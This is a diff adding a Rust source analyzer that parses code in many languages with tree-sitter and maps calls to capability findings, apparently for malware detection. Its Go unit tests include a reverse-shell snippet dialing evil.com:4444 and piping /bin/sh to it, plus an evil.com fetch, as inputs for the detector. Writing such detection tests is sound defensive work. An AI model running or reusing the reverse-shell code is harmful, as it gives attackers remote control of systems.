@@ -1,0 +1,1091 @@
+//! Unified source code analyzer for all AST-based languages.
+//!
+//! This module provides a single analyzer that handles all tree-sitter supported
+//! languages through configuration rather than separate implementations.
+//!
+//! # Design Philosophy
+//!
+//! Instead of having 15+ nearly-identical analyzer files, we:
+//! 1. Define language configurations (tree-sitter language, node types, etc.)
+//! 2. Use a single analysis pipeline that works for all languages
+//! 3. Rely on the trait/YAML system for capability detection
+//! 4. Keep binary analyzers (ELF, PE, Mach-O) and manifest analyzers separate
+
+use crate::analyzers::comment_metrics::{self, CommentStyle};
+use crate::analyzers::function_metrics::{self, FunctionInfo};
+use crate::analyzers::symbol_extraction;
+use crate::analyzers::{identifier_metrics, string_metrics, text_metrics, Analyzer};
+use crate::capabilities::CapabilityMapper;
+use crate::types::*;
+use anyhow::{Context, Result};
+use std::cell::RefCell;
+use std::fs;
+use std::path::Path;
+use tree_sitter::{Language, Parser};
+
+/// Configuration for a language analyzer.
+#[derive(Clone)]
+pub struct LanguageConfig {
+    /// Language identifier (e.g., "python", "javascript")
+    pub name: &'static str,
+    /// File type for reports
+    pub file_type: &'static str,
+    /// Human-readable description
+    pub description: &'static str,
+    /// Tree-sitter language
+    pub language: Language,
+    /// Node types for symbol/call extraction
+    pub call_node_types: &'static [&'static str],
+    /// Node types for function declarations
+    pub function_node_types: &'static [&'static str],
+    /// Field name for function names (usually "name")
+    pub function_name_field: &'static str,
+    /// Node types for string literals
+    pub string_node_types: &'static [&'static str],
+    /// Comment style for metrics
+    pub comment_style: CommentStyle,
+}
+
+/// Get the language configuration for a file type.
+pub fn config_for_file_type(file_type: &crate::analyzers::FileType) -> Option<LanguageConfig> {
+    use crate::analyzers::FileType;
+
+    match file_type {
+        FileType::Python => Some(LanguageConfig {
+            name: "python",
+            file_type: "python",
+            description: "Python script",
+            language: tree_sitter_python::LANGUAGE.into(),
+            call_node_types: &["call"],
+            function_node_types: &["function_definition", "async_function_definition"],
+            function_name_field: "name",
+            string_node_types: &["string", "string_content"],
+            comment_style: CommentStyle::Hash,
+        }),
+        FileType::JavaScript => Some(LanguageConfig {
+            name: "javascript",
+            file_type: "javascript",
+            description: "JavaScript code",
+            language: tree_sitter_javascript::LANGUAGE.into(),
+            call_node_types: &[
+                "call_expression",
+                "assignment_expression",
+                "variable_declarator",
+            ],
+            function_node_types: &[
+                "function_declaration",
+                "function_expression",
+                "arrow_function",
+                "method_definition",
+            ],
+            function_name_field: "name",
+            string_node_types: &["string", "template_string"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::TypeScript => Some(LanguageConfig {
+            name: "typescript",
+            file_type: "typescript",
+            description: "TypeScript code",
+            language: tree_sitter_typescript::LANGUAGE_TYPESCRIPT.into(),
+            call_node_types: &["call_expression"],
+            function_node_types: &[
+                "function_declaration",
+                "function_expression",
+                "arrow_function",
+                "method_definition",
+            ],
+            function_name_field: "name",
+            string_node_types: &["string", "template_string"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::Go => Some(LanguageConfig {
+            name: "go",
+            file_type: "go",
+            description: "Go source code",
+            language: tree_sitter_go::LANGUAGE.into(),
+            call_node_types: &["call_expression"],
+            function_node_types: &["function_declaration", "method_declaration"],
+            function_name_field: "name",
+            string_node_types: &["raw_string_literal", "interpreted_string_literal"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::Rust => Some(LanguageConfig {
+            name: "rust",
+            file_type: "rust",
+            description: "Rust source code",
+            language: tree_sitter_rust::LANGUAGE.into(),
+            call_node_types: &["call_expression", "macro_invocation"],
+            function_node_types: &["function_item"],
+            function_name_field: "name",
+            string_node_types: &["string_literal", "raw_string_literal"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::Ruby => Some(LanguageConfig {
+            name: "ruby",
+            file_type: "ruby",
+            description: "Ruby script",
+            language: tree_sitter_ruby::LANGUAGE.into(),
+            call_node_types: &["call", "method_call"],
+            function_node_types: &["method", "singleton_method"],
+            function_name_field: "name",
+            string_node_types: &["string", "string_content"],
+            comment_style: CommentStyle::Hash,
+        }),
+        FileType::Php => Some(LanguageConfig {
+            name: "php",
+            file_type: "php",
+            description: "PHP script",
+            language: tree_sitter_php::LANGUAGE_PHP.into(),
+            call_node_types: &["function_call_expression"],
+            function_node_types: &["function_definition", "method_declaration"],
+            function_name_field: "name",
+            string_node_types: &["string", "encapsed_string"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::Shell => Some(LanguageConfig {
+            name: "shell",
+            file_type: "shell",
+            description: "Shell script",
+            language: tree_sitter_bash::LANGUAGE.into(),
+            call_node_types: &["command", "command_name"],
+            function_node_types: &["function_definition"],
+            function_name_field: "name",
+            string_node_types: &["string", "raw_string"],
+            comment_style: CommentStyle::Hash,
+        }),
+        FileType::Lua => Some(LanguageConfig {
+            name: "lua",
+            file_type: "lua",
+            description: "Lua script",
+            language: tree_sitter_lua::LANGUAGE.into(),
+            call_node_types: &["function_call"],
+            function_node_types: &["function_declaration", "local_function"],
+            function_name_field: "name",
+            string_node_types: &["string"],
+            comment_style: CommentStyle::Lua,
+        }),
+        FileType::Perl => Some(LanguageConfig {
+            name: "perl",
+            file_type: "perl",
+            description: "Perl script",
+            language: tree_sitter_perl::LANGUAGE.into(),
+            call_node_types: &["function_call", "method_call"],
+            function_node_types: &["subroutine_declaration", "method_declaration"],
+            function_name_field: "name",
+            string_node_types: &["string_literal", "interpolated_string"],
+            comment_style: CommentStyle::Hash,
+        }),
+        FileType::PowerShell => Some(LanguageConfig {
+            name: "powershell",
+            file_type: "powershell",
+            description: "PowerShell script",
+            language: tree_sitter_powershell::LANGUAGE.into(),
+            call_node_types: &["command_expression", "invocation_expression"],
+            function_node_types: &["function_statement"],
+            function_name_field: "name",
+            string_node_types: &["string_literal", "expandable_string_literal"],
+            comment_style: CommentStyle::Hash,
+        }),
+        FileType::Java => Some(LanguageConfig {
+            name: "java",
+            file_type: "java",
+            description: "Java source code",
+            language: tree_sitter_java::LANGUAGE.into(),
+            call_node_types: &["method_invocation"],
+            function_node_types: &["method_declaration", "constructor_declaration"],
+            function_name_field: "name",
+            string_node_types: &["string_literal"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::CSharp => Some(LanguageConfig {
+            name: "csharp",
+            file_type: "csharp",
+            description: "C# source code",
+            language: tree_sitter_c_sharp::LANGUAGE.into(),
+            call_node_types: &["invocation_expression"],
+            function_node_types: &["method_declaration", "constructor_declaration"],
+            function_name_field: "name",
+            string_node_types: &["string_literal", "verbatim_string_literal"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::C => Some(LanguageConfig {
+            name: "c",
+            file_type: "c",
+            description: "C source code",
+            language: tree_sitter_c::LANGUAGE.into(),
+            call_node_types: &["call_expression"],
+            function_node_types: &["function_definition"],
+            function_name_field: "declarator",
+            string_node_types: &["string_literal"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::Swift => Some(LanguageConfig {
+            name: "swift",
+            file_type: "swift",
+            description: "Swift source code",
+            language: tree_sitter_swift::LANGUAGE.into(),
+            call_node_types: &["call_expression"],
+            function_node_types: &["function_declaration"],
+            function_name_field: "name",
+            string_node_types: &["line_string_literal", "multi_line_string_literal"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::ObjectiveC => Some(LanguageConfig {
+            name: "objc",
+            file_type: "objc",
+            description: "Objective-C source code",
+            language: tree_sitter_objc::LANGUAGE.into(),
+            call_node_types: &["message_expression", "call_expression"],
+            function_node_types: &["function_definition", "method_definition"],
+            function_name_field: "declarator",
+            string_node_types: &["string_literal"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::Groovy => Some(LanguageConfig {
+            name: "groovy",
+            file_type: "groovy",
+            description: "Groovy source code",
+            language: tree_sitter_groovy::LANGUAGE.into(),
+            call_node_types: &["method_call", "function_call"],
+            function_node_types: &["method_declaration", "function_declaration"],
+            function_name_field: "name",
+            string_node_types: &["string", "gstring"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::Scala => Some(LanguageConfig {
+            name: "scala",
+            file_type: "scala",
+            description: "Scala source code",
+            language: tree_sitter_scala::LANGUAGE.into(),
+            call_node_types: &["call_expression", "apply_expression"],
+            function_node_types: &["function_definition"],
+            function_name_field: "name",
+            string_node_types: &["string", "interpolated_string"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::Zig => Some(LanguageConfig {
+            name: "zig",
+            file_type: "zig",
+            description: "Zig source code",
+            language: tree_sitter_zig::LANGUAGE.into(),
+            call_node_types: &["call_expression"],
+            function_node_types: &["fn_decl"],
+            function_name_field: "name",
+            string_node_types: &["string_literal"],
+            comment_style: CommentStyle::CStyle,
+        }),
+        FileType::Elixir => Some(LanguageConfig {
+            name: "elixir",
+            file_type: "elixir",
+            description: "Elixir source code",
+            language: tree_sitter_elixir::LANGUAGE.into(),
+            call_node_types: &["call"],
+            function_node_types: &["call"], // def/defp are calls in Elixir's AST
+            function_name_field: "target",
+            string_node_types: &["string", "charlist"],
+            comment_style: CommentStyle::Hash,
+        }),
+        _ => None,
+    }
+}
+
+/// Unified source code analyzer.
+///
+/// Works with any tree-sitter supported language through configuration.
+pub struct UnifiedSourceAnalyzer {
+    config: LanguageConfig,
+    parser: RefCell<Parser>,
+    capability_mapper: CapabilityMapper,
+}
+
+impl UnifiedSourceAnalyzer {
+    /// Create a new analyzer for the given language configuration.
+    pub fn new(config: LanguageConfig) -> Self {
+        let mut parser = Parser::new();
+        parser
+            .set_language(&config.language)
+            .expect("Failed to load language grammar");
+
+        Self {
+            config,
+            parser: RefCell::new(parser),
+            capability_mapper: CapabilityMapper::empty(),
+        }
+    }
+
+    /// Create an analyzer for the given file type.
+    pub fn for_file_type(file_type: &crate::analyzers::FileType) -> Option<Self> {
+        config_for_file_type(file_type).map(Self::new)
+    }
+
+    pub fn with_capability_mapper(mut self, capability_mapper: CapabilityMapper) -> Self {
+        self.capability_mapper = capability_mapper;
+        self
+    }
+
+    pub fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
+        let start = std::time::Instant::now();
+
+        // Parse the source
+        let tree = self
+            .parser
+            .borrow_mut()
+            .parse(content, None)
+            .with_context(|| format!("Failed to parse {} source", self.config.name))?;
+
+        let root = tree.root_node();
+
+        // Create target info
+        let target = TargetInfo {
+            path: file_path.display().to_string(),
+            file_type: self.config.file_type.to_string(),
+            size_bytes: content.len() as u64,
+            sha256: crate::analyzers::utils::calculate_sha256(content.as_bytes()),
+            architectures: None,
+        };
+
+        let mut report = AnalysisReport::new(target);
+
+        // Add structural feature
+        report
+            .structure
+            .push(crate::analyzers::utils::create_language_feature(
+                self.config.name,
+                &format!("tree-sitter-{}", self.config.name),
+                self.config.description,
+            ));
+
+        // Extract functions
+        self.extract_functions(&root, content.as_bytes(), &mut report);
+
+        // Extract strings
+        self.extract_strings(&root, content.as_bytes(), &mut report);
+
+        // Extract symbols for rule matching
+        symbol_extraction::extract_symbols(
+            content,
+            self.config.language.clone(),
+            self.config.call_node_types,
+            &mut report,
+        );
+
+        // Analyze paths and environment variables
+        crate::path_mapper::analyze_and_link_paths(&mut report);
+        crate::env_mapper::analyze_and_link_env_vars(&mut report);
+
+        // Compute metrics
+        report.metrics = Some(self.compute_metrics(&root, content));
+
+        // Evaluate all rules (atomic + composite) and merge into report
+        self.capability_mapper.evaluate_and_merge_findings(
+            &mut report,
+            content.as_bytes(),
+            Some(&tree),
+        );
+
+        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
+        report.metadata.tools_used = vec![format!("tree-sitter-{}", self.config.name)];
+
+        Ok(report)
+    }
+
+    fn extract_functions(
+        &self,
+        root: &tree_sitter::Node,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
+        let mut cursor = root.walk();
+        self.walk_for_functions(&mut cursor, source, report, 0);
+    }
+
+    fn walk_for_functions(
+        &self,
+        cursor: &mut tree_sitter::TreeCursor,
+        source: &[u8],
+        report: &mut AnalysisReport,
+        mut depth: u32,
+    ) {
+        loop {
+            let node = cursor.node();
+            let kind = node.kind();
+
+            if self.config.function_node_types.contains(&kind) {
+                let name = self
+                    .extract_function_name(&node, source)
+                    .unwrap_or_else(|| "anonymous".to_string());
+
+                report.functions.push(Function {
+                    name,
+                    offset: Some(format!("0x{:x}", node.start_byte())),
+                    size: Some((node.end_byte() - node.start_byte()) as u64),
+                    complexity: None,
+                    calls: Vec::new(),
+                    source: format!("tree-sitter-{}", self.config.name),
+                    control_flow: None,
+                    instruction_analysis: None,
+                    register_usage: None,
+                    constants: Vec::new(),
+                    properties: None,
+                    signature: None,
+                    nesting: None,
+                    call_patterns: None,
+                });
+            }
+
+            if cursor.goto_first_child() {
+                if self.config.function_node_types.contains(&kind) {
+                    depth += 1;
+                }
+                continue;
+            }
+            if cursor.goto_next_sibling() {
+                continue;
+            }
+            loop {
+                if !cursor.goto_parent() {
+                    return;
+                }
+                let parent_kind = cursor.node().kind();
+                if self.config.function_node_types.contains(&parent_kind) {
+                    depth = depth.saturating_sub(1);
+                }
+                if cursor.goto_next_sibling() {
+                    break;
+                }
+            }
+        }
+    }
+
+    fn extract_function_name(&self, node: &tree_sitter::Node, source: &[u8]) -> Option<String> {
+        // Try the configured field name first
+        if let Some(name_node) = node.child_by_field_name(self.config.function_name_field) {
+            if let Ok(name) = name_node.utf8_text(source) {
+                if !name.is_empty() {
+                    return Some(name.to_string());
+                }
+            }
+        }
+
+        // Fallback: look for identifier children
+        let mut cursor = node.walk();
+        if cursor.goto_first_child() {
+            loop {
+                let child = cursor.node();
+                if child.kind() == "identifier" || child.kind() == "name" {
+                    if let Ok(name) = child.utf8_text(source) {
+                        if !name.is_empty() {
+                            return Some(name.to_string());
+                        }
+                    }
+                }
+                if !cursor.goto_next_sibling() {
+                    break;
+                }
+            }
+        }
+        None
+    }
+
+    fn extract_strings(
+        &self,
+        root: &tree_sitter::Node,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
+        let mut cursor = root.walk();
+        self.walk_for_strings(&mut cursor, source, report);
+    }
+
+    fn walk_for_strings(
+        &self,
+        cursor: &mut tree_sitter::TreeCursor,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
+        loop {
+            let node = cursor.node();
+            let kind = node.kind();
+
+            if self.config.string_node_types.contains(&kind) || kind.contains("string") {
+                if let Ok(text) = node.utf8_text(source) {
+                    let s = text
+                        .trim_start_matches('"')
+                        .trim_end_matches('"')
+                        .trim_start_matches('\'')
+                        .trim_end_matches('\'')
+                        .trim_start_matches('`')
+                        .trim_end_matches('`')
+                        .trim_start_matches("[[")
+                        .trim_end_matches("]]")
+                        .trim_start_matches("@\"")
+                        .trim_end_matches("\"@");
+
+                    if !s.is_empty() && s.len() < 10000 {
+                        report.strings.push(StringInfo {
+                            value: s.to_string(),
+                            offset: Some(format!("0x{:x}", node.start_byte())),
+                            string_type: StringType::Literal,
+                            encoding: "utf-8".to_string(),
+                            section: Some("ast".to_string()),
+                        });
+                    }
+                }
+            }
+
+            if cursor.goto_first_child() {
+                continue;
+            }
+            loop {
+                if cursor.goto_next_sibling() {
+                    break;
+                }
+                if !cursor.goto_parent() {
+                    return;
+                }
+            }
+        }
+    }
+
+    fn compute_metrics(&self, root: &tree_sitter::Node, content: &str) -> Metrics {
+        let source = content.as_bytes();
+        let total_lines = content.lines().count() as u32;
+
+        let text = text_metrics::analyze_text(content);
+
+        let identifiers = self.extract_identifiers(root, source);
+        let ident_refs: Vec<&str> = identifiers.iter().map(|s| s.as_str()).collect();
+        let identifier_metrics = identifier_metrics::analyze_identifiers(&ident_refs);
+
+        let strings = self.extract_string_values(root, source);
+        let str_refs: Vec<&str> = strings.iter().map(|s| s.as_str()).collect();
+        let string_metrics = string_metrics::analyze_strings(&str_refs);
+
+        let comment_metrics = comment_metrics::analyze_comments(content, self.config.comment_style);
+
+        let func_infos = self.extract_function_info(root, source);
+        let func_metrics = function_metrics::analyze_functions(&func_infos, total_lines);
+
+        Metrics {
+            text: Some(text),
+            identifiers: Some(identifier_metrics),
+            strings: Some(string_metrics),
+            comments: Some(comment_metrics),
+            functions: Some(func_metrics),
+            ..Default::default()
+        }
+    }
+
+    fn extract_identifiers(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
+        let mut identifiers = Vec::new();
+        let mut cursor = root.walk();
+
+        loop {
+            let node = cursor.node();
+            if node.kind() == "identifier" || node.kind() == "name" {
+                if let Ok(text) = node.utf8_text(source) {
+                    if !text.is_empty() {
+                        identifiers.push(text.to_string());
+                    }
+                }
+            }
+
+            if cursor.goto_first_child() {
+                continue;
+            }
+            if cursor.goto_next_sibling() {
+                continue;
+            }
+            loop {
+                if !cursor.goto_parent() {
+                    return identifiers;
+                }
+                if cursor.goto_next_sibling() {
+                    break;
+                }
+            }
+        }
+    }
+
+    fn extract_string_values(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
+        let mut strings = Vec::new();
+        let mut cursor = root.walk();
+
+        loop {
+            let node = cursor.node();
+            let kind = node.kind();
+
+            if self.config.string_node_types.contains(&kind) || kind.contains("string") {
+                if let Ok(text) = node.utf8_text(source) {
+                    let s = text
+                        .trim_start_matches('"')
+                        .trim_end_matches('"')
+                        .trim_start_matches('\'')
+                        .trim_end_matches('\'');
+                    if !s.is_empty() {
+                        strings.push(s.to_string());
+                    }
+                }
+            }
+
+            if cursor.goto_first_child() {
+                continue;
+            }
+            if cursor.goto_next_sibling() {
+                continue;
+            }
+            loop {
+                if !cursor.goto_parent() {
+                    return strings;
+                }
+                if cursor.goto_next_sibling() {
+                    break;
+                }
+            }
+        }
+    }
+
+    fn extract_function_info(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<FunctionInfo> {
+        let mut functions = Vec::new();
+        let mut cursor = root.walk();
+        self.walk_for_function_info(&mut cursor, source, &mut functions, 0);
+        functions
+    }
+
+    fn walk_for_function_info(
+        &self,
+        cursor: &mut tree_sitter::TreeCursor,
+        source: &[u8],
+        functions: &mut Vec<FunctionInfo>,
+        mut depth: u32,
+    ) {
+        loop {
+            let node = cursor.node();
+            let kind = node.kind();
+
+            if self.config.function_node_types.contains(&kind) {
+                let mut info = FunctionInfo::default();
+                if let Some(name) = self.extract_function_name(&node, source) {
+                    info.name = name;
+                }
+                info.is_anonymous = info.name.is_empty();
+                info.start_line = node.start_position().row as u32;
+                info.end_line = node.end_position().row as u32;
+                info.line_count = info.end_line.saturating_sub(info.start_line) + 1;
+                info.nesting_depth = depth;
+                functions.push(info);
+            }
+
+            if cursor.goto_first_child() {
+                if self.config.function_node_types.contains(&kind) {
+                    depth += 1;
+                }
+                continue;
+            }
+            if cursor.goto_next_sibling() {
+                continue;
+            }
+            loop {
+                if !cursor.goto_parent() {
+                    return;
+                }
+                let parent_kind = cursor.node().kind();
+                if self.config.function_node_types.contains(&parent_kind) {
+                    depth = depth.saturating_sub(1);
+                }
+                if cursor.goto_next_sibling() {
+                    break;
+                }
+            }
+        }
+    }
+}
+
+impl Analyzer for UnifiedSourceAnalyzer {
+    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
+        let bytes = fs::read(file_path).context("Failed to read file")?;
+        let content = String::from_utf8_lossy(&bytes);
+        self.analyze_source(file_path, &content)
+    }
+
+    fn can_analyze(&self, _file_path: &Path) -> bool {
+        true
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::analyzers::FileType;
+    use std::path::PathBuf;
+
+    #[test]
+    fn test_python_analysis() {
+        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Python).unwrap();
+        let path = PathBuf::from("test.py");
+        let code = r#"
+import os
+
+def main():
+    os.system("echo hello")
+    print("world")
+
+if __name__ == "__main__":
+    main()
+"#;
+        let report = analyzer.analyze_source(&path, code).unwrap();
+        assert!(report.structure.iter().any(|s| s.id.contains("python")));
+        assert!(!report.functions.is_empty());
+        assert!(!report.strings.is_empty());
+    }
+
+    #[test]
+    fn test_javascript_analysis() {
+        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
+        let path = PathBuf::from("test.js");
+        let code = r#"
+const http = require('http');
+
+function fetchData(url) {
+    return http.get(url);
+}
+
+const handler = async () => {
+    await fetchData("http://example.com");
+};
+"#;
+        let report = analyzer.analyze_source(&path, code).unwrap();
+        assert!(report.structure.iter().any(|s| s.id.contains("javascript")));
+        assert!(!report.functions.is_empty());
+    }
+
+    #[test]
+    fn test_go_analysis() {
+        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Go).unwrap();
+        let path = PathBuf::from("test.go");
+        let code = r#"
+package main
+
+import "fmt"
+
+func main() {
+    fmt.Println("Hello, World!")
+}
+"#;
+        let report = analyzer.analyze_source(&path, code).unwrap();
+        assert!(report.structure.iter().any(|s| s.id.contains("go")));
+        assert!(!report.functions.is_empty());
+    }
+
+    #[test]
+    fn test_all_languages_have_configs() {
+        // Ensure all source code file types have configurations
+        let types = vec![
+            FileType::Python,
+            FileType::JavaScript,
+            FileType::TypeScript,
+            FileType::Go,
+            FileType::Rust,
+            FileType::Ruby,
+            FileType::Php,
+            FileType::Shell,
+            FileType::Lua,
+            FileType::Perl,
+            FileType::PowerShell,
+            FileType::Java,
+            FileType::CSharp,
+            FileType::C,
+            FileType::Swift,
+            FileType::ObjectiveC,
+            FileType::Groovy,
+            FileType::Scala,
+            FileType::Zig,
+            FileType::Elixir,
+        ];
+
+        for ft in types {
+            assert!(
+                config_for_file_type(&ft).is_some(),
+                "Missing config for {:?}",
+                ft
+            );
+        }
+    }
+
+    // Go-specific capability detection tests
+    // These verify the unified analyzer correctly detects Go capabilities via the trait system
+
+    fn analyze_go_code(code: &str) -> crate::types::AnalysisReport {
+        let mapper = crate::capabilities::CapabilityMapper::new();
+        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Go)
+            .unwrap()
+            .with_capability_mapper(mapper);
+        let path = PathBuf::from("test.go");
+        analyzer.analyze_source(&path, code).unwrap()
+    }
+
+    #[test]
+    fn test_detect_exec_command() {
+        let code = r#"
+package main
+import "os/exec"
+func main() {
+    cmd := exec.Command("ls", "-la")
+    cmd.Run()
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|c| c.id == "exec/command/exec-command"),
+            "Expected exec/command/exec-command, found: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_detect_syscall_exec() {
+        let code = r#"
+package main
+import "syscall"
+func main() {
+    syscall.Exec("/bin/sh", []string{}, nil)
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|c| c.id == "exec/command/syscall-exec"),
+            "Expected exec/command/syscall-exec, found: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_detect_reverse_shell() {
+        let code = r#"
+package main
+import ("net"; "os/exec")
+func main() {
+    conn, _ := net.Dial("tcp", "evil.com:4444")
+    cmd := exec.Command("/bin/sh")
+    cmd.Stdin = conn
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(
+            report.findings.iter().any(|c| c.id == "comm/socket/dial"),
+            "Expected comm/socket/dial, found: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|c| c.id == "exec/command/exec-command"),
+            "Expected exec/command/exec-command, found: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_detect_net_listen() {
+        let code = r#"
+package main
+import "net"
+func main() {
+    ln, _ := net.Listen("tcp", ":8080")
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(
+            report.findings.iter().any(|c| c.id == "comm/socket/listen"),
+            "Expected comm/socket/listen, found: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_detect_net_dial() {
+        let code = r#"
+package main
+import "net"
+func main() {
+    conn, _ := net.Dial("tcp", "example.com:80")
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(
+            report.findings.iter().any(|c| c.id == "comm/socket/dial"),
+            "Expected comm/socket/dial, found: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_detect_http_get() {
+        let code = r#"
+package main
+import "net/http"
+func main() {
+    resp, _ := http.Get("https://example.com")
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|c| c.id == "comm/socket/http-get"),
+            "Expected comm/socket/http-get, found: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_detect_http_server() {
+        let code = r#"
+package main
+import "net/http"
+func main() {
+    http.ListenAndServe(":8080", nil)
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|c| c.id == "comm/socket/http-listen"),
+            "Expected comm/socket/http-listen, found: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_detect_aes_encryption() {
+        let code = r#"
+package main
+import "crypto/aes"
+func main() {
+    key := []byte("secret")
+    block, _ := aes.NewCipher(key)
+    _ = block
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|c| c.id == "crypto/cipher/aes-new-cipher"),
+            "Expected crypto/cipher/aes-new-cipher, found: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_detect_rsa_encryption() {
+        let code = r#"
+package main
+import "crypto/rsa"
+func main() {
+    key, _ := rsa.GenerateKey(rand.Reader, 2048)
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|c| c.id == "crypto/cipher/rsa-generate-key"),
+            "Expected crypto/cipher/rsa-generate-key, found: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_detect_file_write() {
+        let code = r#"
+package main
+import "os"
+func main() {
+    f, _ := os.Create("test.txt")
+    f.WriteString("data")
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(
+            report.findings.iter().any(|c| c.id == "fs/file/os-create"),
+            "Expected fs/file/os-create, found: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_go_structural_feature() {
+        let code = "package main\nfunc main() {}";
+        let report = analyze_go_code(code);
+        assert!(report
+            .structure
+            .iter()
+            .any(|s| s.id == "source/language/go"));
+    }
+
+    #[test]
+    fn test_go_extract_functions() {
+        let code = r#"
+package main
+
+func hello() string {
+    return "world"
+}
+
+func main() {
+    hello()
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report.functions.len() >= 2);
+        assert!(report.functions.iter().any(|f| f.name == "hello"));
+        assert!(report.functions.iter().any(|f| f.name == "main"));
+    }
+
+    #[test]
+    fn test_go_multiple_capabilities() {
+        let code = r#"
+package main
+import ("os/exec"; "net/http"; "os")
+
+func main() {
+    exec.Command("whoami").Run()
+    http.Get("https://evil.com")
+    os.Remove("/tmp/file")
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(
+            report.findings.len() >= 2,
+            "Expected >= 2 findings, found: {}",
+            report.findings.len()
+        );
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|c| c.id == "exec/command/exec-command"),
+            "Expected exec/command/exec-command"
+        );
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|c| c.id == "comm/socket/http-get"),
+            "Expected comm/socket/http-get"
+        );
+    }
+}
